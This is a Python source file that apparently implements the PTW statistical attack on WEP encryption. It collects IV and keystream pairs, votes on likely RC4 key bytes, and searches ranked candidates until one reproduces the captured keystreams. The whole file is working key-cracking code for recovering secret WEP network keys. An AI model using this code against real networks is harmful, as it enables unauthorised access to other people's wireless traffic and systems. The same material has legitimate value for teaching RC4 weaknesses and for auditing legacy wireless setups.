import numpy as np
import sys
import Constants as const
import copy
from HelperClass import *



initial_rc4 = [i for i in range(const.LEN_S)]

eval_val = [
0.00534392069257663,
0.00531787585068872,
0.00531345769225911,
0.00528812219217898,
0.00525997750378221,
0.00522647312237696,
0.00519132541143668,
0.0051477139367225,
0.00510438884847959,
0.00505484662057323,
0.00500502783556246,
0.00495094196451801,
0.0048983441590402
]


def compare(ina: tableentry) -> int:
    return ina.votes


def comparedoublesorthelper(ina: doublesorthelper) -> int:
    return ina.difference


def comparesorthelper(ina: sorthelper) -> int:
    return ina.distance


def rc4init(key: list, keylen: int):
    state = rc4state()
    state.s = copy.deepcopy(initial_rc4)
    j = 0
    for i in range(const.LEN_S):
        j = (j + state.s[i] + key[i % keylen]) % const.LEN_S
        state.s[i], state.s[j] = state.s[j], state.s[i]

    state.i = 0
    state.j = 0
    return state


def rc4update(state: rc4state):
    state.i += 1
    state.i %= const.LEN_S
    state.j += state.s[state.i]
    state.j %= const.LEN_S
    state.s[state.i], state.s[state.j] = state.s[state.j], state.s[state.i]
    k = (state.s[state.i] + state.s[state.j]) % const.LEN_S

    return state.s[k]


def guesskeybytes(iv: list, keystream: list, kb: int):
    state = copy.deepcopy(initial_rc4)
    j = 0
    tmp = 0
    jj = const.IVBYTES
    ii = 0
    s = 0
    result = [0] * const.MAINKEYBYTES

    for i in range(const.IVBYTES):
        j += (state[i]+iv[i])
        j %= const.LEN_S
        state[i], state[j] = state[j], state[i]

    for i in range(kb):
        tmp = (jj-int(keystream[jj-1])) % const.LEN_S
        ii = 0
        while tmp != state[ii]:
            ii += 1
        s += state[jj]
        s %= const.LEN_S
        ii -= (j+s)
        ii %= const.LEN_S
        result[i] = ii
        jj += 1

    return result


def correct(state: attackstate, key: list, keylen: int):

    # for i in range(state.sessions_collected):
    #     print(state.sessions[i].iv)

    # if(key[:5] == [31,31,31,31,31]):
    #     print(key)

    for i in range(state.sessions_collected):
        keybuf = []
        for j in range(const.IVBYTES):
            keybuf.append(copy.deepcopy(state.sessions[i].iv[j]))
        for j in range(keylen):
            keybuf.append(copy.deepcopy(key[j]))
        rcstate = rc4init(keybuf, keylen+const.IVBYTES)
        # print(rcstate)
        # print(state.sessions[i+1].iv)
        for j in range(const.TESTBYTES):
            if (rc4update(rcstate) ^ state.sessions[i].keystream[j]) != 0:
                return 0

    return 1


def getdrv(orgtable, keylen):
    numvotes = 0
    # help = 0.0
    # maxhelp = 0.0
    # maxi = 0.0
    # emax = 0.0
    # e2 = 0.0
    normal = [None]*const.MAINKEYBYTES
    outlier = [None]*const.MAINKEYBYTES
    for i in range(const.LEN_S):
        numvotes += orgtable[0][i].votes

    e = numvotes/const.LEN_S
    for i in range(keylen):
        emax = eval_val[i] * numvotes
        e2 = ((1.0 - eval_val[i])/255.0) * numvotes
        normal[i] = 0
        outlier[i] = 0
        maxhelp = 0.0
        maxi = 0.0
        for j in range(const.LEN_S):
            if orgtable[i][j].votes > maxhelp:
                maxhelp = orgtable[i][j].votes
                maxi = j

        for j in range(const.LEN_S):
            if j == maxi:
                help = (1.0-orgtable[i][j].votes/emax)
            else:
                help = (1.0-orgtable[i][j].votes/e2)
            help = help*help
            outlier[i] += help
            help = (1.0-orgtable[i][j].votes/e)
            help = help*help
            normal[i] += help

    return normal, outlier





def doround(sortedtable, keybyte, fixat, fixvalue, searchborders, key, keylen, state, sum, strongbytes) -> int:
    if keybyte == keylen:
        return correct(state, key, keylen)
    elif strongbytes[keybyte] == 1:
        tmp = 3 + keybyte
        for i in range(keybyte-1, 0, -1):
            tmp += 3 + key[i] + i
            key[keybyte] = (256 - tmp) % const.LEN_S
            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, (256-tmp+sum)%256, strongbytes) == 1:
                return 1
        return 0
    elif keybyte == fixat:
        key[keybyte] = (fixvalue - sum) % const.LEN_S
        return doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, fixvalue, strongbytes)
    else:
        for i in range(searchborders[keybyte]):
            key[keybyte] = (sortedtable[keybyte][i].b - sum) % const.LEN_S
            if doround(sortedtable, keybyte+1, fixat, fixvalue, searchborders, key, keylen, state, sortedtable[keybyte][i].b, strongbytes) == 1:
                return 1
        return 0


def docomputation(state, key, keylen, table, sh2, strongbytes, keylimit) -> int:
    choices = [1] * const.MAINKEYBYTES
    for i in range(keylen):
        if strongbytes[i] == 1:
            choices[i] = i
        else:
            choices[i] = 1

    i = 0
    prod = 0
    fixat = -1
    fixvalue = 0


    while prod < keylimit:
        if doround(table, 0, fixat, fixvalue, choices, key, keylen, state, 0, strongbytes) == 1:
            return 1

        choices[sh2[i].keybyte] += 1
        fixat = sh2[i].keybyte
        fixvalue = sh2[i].value
        prod = 1
        for j in range(keylen):
            prod *= choices[j]

        while True:
            i += 1
            if strongbytes[sh2[i].keybyte] != 1:
                break


    return 0


def computekey(state, keybuf, keylen, testlimit) -> int:
    strongbytes = [0]*const.MAINKEYBYTES
    helper = []
    for i in range(const.MAINKEYBYTES):
        helper.append(doublesorthelper())

    onestrong = (testlimit/10) * 2
    twostrong = (testlimit/10)
    simple = testlimit - onestrong - twostrong

    table = copy.deepcopy(state.table)
    for i in range(keylen):
        table[i] = sorted(table[i], key=compare, reverse=True)
        strongbytes[i] = 0

    sh1 = []
    for i in range(keylen):
        sh1.append([])
        for j in range(const.LEN_S-1):
            sh1[i].append(sorthelper())

    for i in range(keylen):
        for j in range(1, const.LEN_S):
            sh1[i][j-1].distance = table[i][0].votes - table[i][j].votes
            sh1[i][j-1].value = table[i][j].b
            sh1[i][j-1].keybyte = i

    sh = [item for sublist in sh1 for item in sublist]
    sh = sorted(sh, key=comparesorthelper, reverse=False)

    if docomputation(state, keybuf, keylen, table, sh, strongbytes, simple) == 1:
        return 1

    normal, outlier = getdrv(state.table, keylen)
    for i in range(keylen-1):
        helper[i].keybyte = i+1
        helper[i].difference = normal[i+1] - outlier[i+1]

    helper = sorted(helper[:keylen-1], key=comparedoublesorthelper, reverse=True)
    strongbytes[helper[0].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, onestrong) == 1:
        return 1

    strongbytes[helper[1].keybyte] = 1
    if docomputation(state, keybuf, keylen, table, sh, strongbytes, twostrong) == 1:
        return 1

    return 0


def addsession(state, iv, keystream):
    i = (iv[0] << 16) | (iv[1] << 8) | (iv[2])
    il = i//8
    ir = 1 << (i % 8)
    if (state.seen_iv[il] & ir) == 0:
        state.packets_collected += 1
        state.seen_iv[il] = state.seen_iv[il] | ir
        buf = guesskeybytes(iv, keystream, const.MAINKEYBYTES)
        for i in range(0, const.MAINKEYBYTES):
            state.table[i][buf[i]].votes += 1

        # for i in range(const.MAINKEYBYTES):
        #     for j in range(const.LEN_S):
        #         print(str(i)+", "+str(j) + ", " + str(state.table[i][buf[i]].votes))

        if state.sessions_collected < 10:
            state.sessions[state.sessions_collected].iv = iv
            state.sessions[state.sessions_collected].keystream = keystream
            state.sessions_collected += 1

        return 1
    else:
        return 0


def newattackstate():
    state = attackstate()
    for i in range(const.MAINKEYBYTES):
        for k in range(const.LEN_S):
            state.table[i][k].b = k

    return state



